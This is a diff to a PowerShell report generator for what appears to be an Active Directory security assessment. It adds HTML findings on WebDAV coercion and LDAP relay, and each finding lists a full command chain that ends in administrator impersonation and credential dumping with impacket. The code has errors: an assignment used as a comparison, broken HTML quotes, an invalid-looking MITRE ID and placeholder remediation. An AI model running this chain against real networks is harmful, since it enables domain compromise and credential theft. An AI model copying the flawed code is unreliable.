@@ -363,7 +363,124 @@ function Generate-MISChtml {
             elseif ($finding.Technique -eq "LDAP signing or channel binding is not enforced") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
                 $html += @"
-"@
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Absence of LDAP signing on domain controllers allows devices to be fully compromised through relay attacks.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Domain Controller</td><td>$($finding.DomainController)</td></tr>
+                                            <tr><td class="grey">LDAP Signing</td><td>False</td></tr>
+                                        </table></td>
+                                        <td class="explanation">    
+                                            <p>The WebClient service allows users to connect to WebDAV shares and is commonly seen in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string. The service is installed by default on Windows 10 machines, however is vulnerable to a 'by-design' authentication coercion bug. Machine account authentication coerced from a machine via WebDAV will use the HTTP protocol, which can be relayed to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
+                                            <p>$($finding.Issue).</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
+                                            <p><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
+                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
+                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
+                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
+                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
+                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
+                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
+                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
+                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are alloweed to delegte to this service as setup by the HTTP to LDAP relay.</p>
+                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\$:h4x -impersonate administrator</p>
+                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
+                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
+                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Enforce LDAP Signing & channel binding</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
             }
             elseif ($finding.Technique -match "Spooler service") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
@@ -472,7 +589,130 @@ function Generate-MISChtml {
             elseif ($finding.Technique -match "WebDAV") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
                 $html += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
 "@
+                if ($finding.Score = 30) {
+                    $html += "<td>The WebClient service running on a device and absence of LDAP signing allows a remote attacker to take control of the machine.</td>"
+                }else{
+                    $html += "<td>The WebClient service is running on a device however LDAP signing mitigates attacks scope.</td>"
+                }
+                $html+=@"
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Computers</td><td>$($finding.Computers -replace "`r?`n", "<br>")</td></tr>
+                                            <tr><td class="grey">WebDAV enabled</td><td>$($finding.WebDAVEnabled)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">    
+                                            <p>The WebClient service allows users to connect to WebDAV shares and is commonly seen in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string. The service is installed by default on Windows 10 machines, however is vulnerable to a 'by-design' authentication coercion bug. Machine account authentication coerced from a machine via WebDAV will use the HTTP protocol, which can be relayed to LDAP (if signing requirements are not enforced) and perform any action that machine has permission to perfrom. Machine accounts have permission to update their own 'msDS-AllowedToActOnBehalfOfOtherIdentity' property meaning that authentication can be coerced, relayed to ldap, then set resource-based constrained delegation on themselves to give a low privileged attacker full control over any machine running the WebClient service.</p>
+                                            <p>$($finding.Issue).</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/">Link 1</a></p>
+                                            <p><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low privileged user can check for systems with the WebClient service running (\\<computer>\pipe\DAV RPC SERVICE will be exposed) and also if the domain controller requires ldap signing and channel binding. If not, the computer running the webclient service can be compromised.</p>
+                                                    <p class="code">nxc smb 192.168.10.205 -u test -p 'Password123!' -M webdav</p>
+                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A DNS record can be added by any low-privileged user to the domain that points to the attack machine (needed for the authentication coercion over HTTP).</p>
+                                                    <p class="code">python3 dnstool.py -u test.local\\test -p 'Password123!' -r attackerDNS.test.local -d 192.168.10.130 --action add dc.test.local</p>
+                                                    <p>A low-privileged user can then add a computer to the domain to provide an account wth an SPN for the frontend service for the RBCD that will be setup over the target server running the WebClient service.</p>
+                                                    <p class="code>impacket-addcomputer -computer-name 'attackerComputer$' -computer-pass 'h4x' test.local/test:'Password123!'</p>
+                                                    <p>A low-privileged user can then coerce machine authentication using RPC from the target machine to the kali machine over http (by specifying @8080).</p>
+                                                    <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. A listener to relay the HTTP authentication is setup to relay the HTTP authentication from the target server to LDAP on the domain controller, to update the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server with attackerComputer$ (the computer added).</p>
+                                                    <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>4. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend as they are alloweed to delegte to this service as setup by the HTTP to LDAP relay.</p>
+                                                    <p class="code">impacket-getST -spn cifs/DESKTOP-JKTS35O.test.local test.local/attackerComputer\$:h4x -impersonate administrator</p>
+                                                    <p>With a ticket obtained for the backend service, an adversary can remotely extract all the credential matter from the target computer running the WebClient service.</p>
+                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
+                                                    <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>Enforce LDAP Signing & channel binding</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
             }
             elseif ($finding.Technique -match "Organizational Units") {
                 $nospaceid = $finding.Technique.Replace(" ", "-")
